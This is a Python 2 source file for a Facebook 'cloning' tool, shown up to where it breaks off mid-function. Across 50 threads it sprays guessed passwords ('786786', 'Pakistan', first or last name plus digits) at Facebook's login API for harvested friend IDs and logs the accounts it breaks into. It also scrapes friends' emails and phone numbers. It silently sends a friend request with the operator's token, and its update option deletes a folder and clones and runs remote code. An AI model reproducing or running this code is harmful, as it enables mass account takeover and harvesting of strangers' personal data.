#!/usr/bin/python
# coding=utf-8
# Originally Written By:Muhammad Hamza
# Source : Python2"
# Donot Recode It.

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install requests")
try:
	import requests
except ImportError:
	os.system("pip2 install mechanize")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#-Back-#
def exit():
	print "[!] Exit"
	os.sys.exit()
	
#-Warna-#
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	
#-Animation-#
def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
def exitt():
    os.system('exit')
		
##### LOGO #####
banner = """
\033[1;97m   _____       _ _____    _ 
\033[1;97m  / ____|     (_)_   _|  | |
\033[1;97m | (___   __ _ _  | |  __| |
\033[1;97m  \___ \ / _` | | | | / _` |
\033[1;97m  ____) | (_| | |_| || (_| |
\033[1;97m |_____/ \__,_| |_____\__,_|
\033[1;97m             _/ |           
\033[1;97m            |__/            
\033[1;97m---------------------------------------------------
 
➣ Coder     : Sajid Mallah
➣ Github    : https://github.com/sajidprog
➣ Facebook  : Sajid Mallah
➣ Whatsapp  : +1501-888-9032
➣ Warning   : I'M Not Responsible For Any Illegal Act.

---------------------------------------------------"""
# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[!] \033[1;97mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(0.1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### ToolLogin #####
#=================#
def tlogin():
	os.system('clear')
	print banner
	username = raw_input("[+] TOOL USERNAME : ")
	passw = raw_input("[+] TOOL PASSCODE : ")
	
	if passw =="":
		print"\033[1;91m[!] Wrong"
		exit()
	elif passw =="1626":
		hamza('[✔] Tool Login Successful')
		os.system('xdg-open https://wa.me/+15018889032')
		time.sleep(0.1)
		try:
			toket = open('login.txt','r')
			menu()
		except (KeyError,IOError):
			masuk()
	else:
		print "[!] Wrong Input"
		time.sleep(0.1)
		exit()

##### Pilih Login #####
def masuk():
	os.system('clear')
	print banner
	print "[1] Login With Facebook."
	print "[2] Login Using Token."
	print "[3] Exit"
	print ('      ')
	msuk = raw_input("Choose Option >  ")
	if msuk =="":
		print"[!]  Wrong Input"
		exit()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()
		
##### LOGIN #####
#================#
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print banner
		hamza('[+] Login Your Facebook Account')
		hamza('[!] Donot Use Your Personal Account')
		print"[!] Use a New Facebook Account To Login"
		
		id = raw_input('[+] Number/Username/Id : ')
		pwd = getpass.getpass('[+] Password           : ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"[!] No Internet Connection"
			exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				hamza('[✔] Logged In Successfully')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				os.system('xdg-open https://wa.me/+15018889032')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				exit()
		if 'checkpoint' in url:
			hamza('[!] Account Is On Checkpoint')
			os.system('rm -rf login.txt')
			time.sleep(0.1)
			exit()
		else:
			print("[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(0.1)
			login()
			
##### TOKEN #####
def tokenz():
	os.system('clear')
	print banner
	print('        ')
	toket = raw_input("\033[1;97m[?] \033[1;97mToken\033[1;97m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "[!] Wrong Token"
		e = raw_input("[?] Do You Want To PickUp Token?: ")
		if e =="":
			exit()
		elif e =="y":
			login()
		else:
			exit()
			
##### MENU ##########################################
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		exit()
	os.system("clear")
	print banner
	print "║[✔] Name : "+nama
	print "║[✔] ID   : "+id
	print "\033[1;97m╚"+40*"═"
	print('-----------------------')
	print "[1] Start Cloning."
	print "[2] Grabbing Tools."
	print "[3] Auto Del Tools."
	print "[4] Update HOP Tool."
	print "[5] Follow Me On Facebook."
	print "[6] Delete Trash File."
	print "[7] Logout"
	print "[8] Exit Programme."
	print ('                  ')
	men()

def men():
	rana = raw_input("Choose Option >  ")
	if rana =="":
		print " Wrong Input"
		men()
	elif rana =="1":
		paki()
	elif rana =="2":
		dump()
	elif rana =="3":
		menu_bot()
	elif rana =="4":
		os.system('ls')
		os.system('cd ..')
		os.system('ls')
		os.system('rm -rf hop')
		os.system('git clone https://github.com/Hamzahash/hop.git')
		os.system('cd hop')
		os.system('python2 hop.py')
	elif rana =="5":
		os.system('xdg-open https://www.facebook.com/muhammad.hamza1626')
		menu()
	elif rana =="6":
		os.system('rm -rf out')
		hamza('[✔] Trash Cleaned Successfully')
		menu()
	elif rana =="7":
		os.system('rm -rf login.txt')
		hamza('[✔] Logged Out Successfully')
		os.system('xdg-open https://www.facebook.com/profile.php?id=100028340285191')
		tlogin()
	elif rana =="8":
		exitt()
	else:
		print "[!] Wrong Input"
		men()
	
##### INFO #####
def paki():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print banner
	print "[1] Clone From Friendlist."
	print "[2] Clone From Any Public ID."
	print "[0] Back."
	paki_super()

def paki_super():
	peak = raw_input("Choose Option >  ")
	if peak =="":
		print "[!] Filled Incorrectly"
		paki_super()
	elif peak =="1":
		os.system('clear')
		print banner
		print "\033[1;97m[!] Please Wait"
		hamza('\033[1;97m[!] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[✔] Account Name \033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print"[!] ID Not Found!"
			raw_input("[Back] ")
			paki()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	
	elif peak =="0":
		menu()
	else:
		print "Filled Incorrectly"
		paki_super()
	
        print "[✔] Total Friends : "+str(len(id))
	hamza('[✔] The Process Has Been Started.')
        hamza('[!] To Stop Process Press CTRL Then Z')
        hamza('---------------------------------------------------')
     
	
	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = '786786'										
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = 'Pakistan'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['first_name'] + '786'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass3									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '123'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass4											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '1234'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass5							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = b['first_name'] + '12345'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass6											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['last_name'] + '123'			
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass7					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass8											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass8
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + 'khan'		
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass9			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass9
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)
	
																	
															
		except:
			pass
		
	p = ThreadPool(50)
	p.map(main, id)
	print "\033[1;97m---------------------------------------------------"
	
	print '\033[1;97mProcess Has Been Completed.'
	print"\033[1;97m-----------------"
	print"\033[1;32m OK/\x1b[1;97mCP \033[1;97m: \033[1;32m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print "\033[1;97m---------------------------------------------------"
	
	

	
	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
	menu()	

		
##### DUMP #####
def dump():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	os.system('clear')
	print banner
	print "[1] Extract Numeric IDs From Public ID."
	print "[2] Extract Email's From Public ID."
	print "[3] Extract Phone Number From Public ID."
	print "[0] Back."
	print('          ')
	dump_two()
	
#-----pilih
def dump_two():
	guru = raw_input("Choose Option> ")
	if guru =="":
		print " Wrong Input"
		dump_two()
	elif guru =="1":
		idfrom_friend()
	elif guru =="2":
		emailfrom_friend()
	elif guru =="3":
		hpfrom_friend()
	elif guru =="0":
		menu()
	else:
		print "[!] Wrong input"
		dump_two()
		


##### Extract IDs From Public Id #####
def idfrom_friend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✔] Account Name : "+op["name"]
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("[Back] ")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
		z=json.loads(r.text)
		hamza('[✔] Getting Friends Numeric IDs...')
		print"--------------------------------------"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;97m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;97m[\033[1;97m✔\033[1;97m] \033[1;97mSuccessfully Extracted Numeric  IDs From Given ID. \033[1;97m....'
		print"\r\033[1;97m[✔] \033[1;97mTotal IDs \033[1;97m: \033[1;97m%s"%(len(hpfromteman))
		done = raw_input("\r\033[1;97m[✔] \033[1;97mSave File With Name\033[1;97m :\033[1;97m ")
		print("\r\033[1;97m[✔] \033[1;97mFile Saved As \033[1;97m: \033[1;97mout/"+done)
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except IOError:
		print"\033[1;97m[!] Error While Creating file"
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!]The Process Has Been Stopped")
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except KeyError:
		print('\033[1;97m[!] Error')
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[✖] No Connection"
		exit()

##### EMAIL FROM TEMAN #####
def emailfrom_friend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✔] Account Name : "+op["name"]
		except KeyError:
			print"[!] Account Not Found"
			raw_input("[Back] ")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		hamza('[✔] Getting Emails From')
		print 42*"\033[1;97m═"
		bz = open('out/em_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromteman.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;97m"+str(len(emfromteman))+"\033[1;97m ]\033[1;97m  \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print "----------------------------------"
		print '[✔] Successfully Extracted Mails.....'
		print"\r\033[1;97m[✔] \033[1;9⅞mTotal Mails \033[1;97m: \033[1;97m%s"%(len(emfromteman))
		done = raw_input("\r\033[1;97m[✔] \033[1;97mSave File With Name\033[1;97m :\033[1;97m ")
		print("\r\033[1;97m[✔] \033[1;97mFile Saved As \033[1;97m: \033[1;97mout/"+done)
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except IOError:
		print"\033[1;97m[!] Error While Creating file"
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!]The Process Has Been Stopped")
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except KeyError:
		print('\033[1;97m[!] Error')
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[✖] No Connection"
		exit()
		


##### Number From Public Id #####
def hpfrom_friend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✔] Account Name : "+op["name"]
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		hamza('\033[1;97m[✔] \033[1;97mGetting All Numbers \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/no_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hpfromteman.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;97m"+str(len(hpfromteman))+"\033[1;97m ]\033[1;97m \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print "-----------------------------------"
		print"\r\033[1;97m[✔] \033[1;97mTotal IDs \033[1;97m: \033[1;97m%s"%(len(hpfromteman))
		done = raw_input("\r\033[1;97m[✔] \033[1;97mSave File With Name\033[1;97m :\033[1;97m ")
		print("\r\033[1;97m[✔] \033[1;97mFile Saved As \033[1;97m: \033[1;97mout/"+done)
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except IOError:
		print"\033[1;97m[!] Error While Creating file"
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!]The Process Has Been Stopped")
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
		dump()
	except KeyError:
		print('\033[1;97m[!] Error')
		raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[✖] No Connection"
		exit()

##### MENU BOT #####
#----------------------------------------#
def menu_bot():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	os.system('clear')
	print banner
	print "[1] Auto Delete Posts."
	print "[2] Auto Accept Friend Requests."
	print "[3] Auto Unfriend All."
	print "[0] Back."
	print ('         ')
	bot_tool()
#////////////
def bot_tool():
	bots = raw_input("Choose Option> ")
	if bots =="":
		print "[!] Wrong Input"
		bot_tool()
	elif bots =="1":
		deletepost()
	elif bots =="2":
		accept()
	elif bots =="3":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "[!] Wrong Input"
		bot_tool()
		


##### Auto Delt Post #####
def deletepost():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
		lol = json.loads(nam.text)
		nama = lol['name']
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	os.system('clear')
	print banner
	print("\033[1;97m[✔] \033[1;97mAccount Name \033[1;97m: \033[1;97m%s"%nama)
	hamza("\033[1;97m[✔] \033[1;97mThe Process Has Been Started\033[1;97m ...")
	print "---------------------------------"
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m] \033[1;97m[!] Failed'
		except TypeError:
			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m \033[1;97[✔] [Deleted]'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91m[!] Connection Error"
			raw_input("[Back] ")
			menu_bot()
	print "----------------------------------"
	print"[✔] The Process Has Been Completed. "
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### ACCEPT FRIEND #####
def accept():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
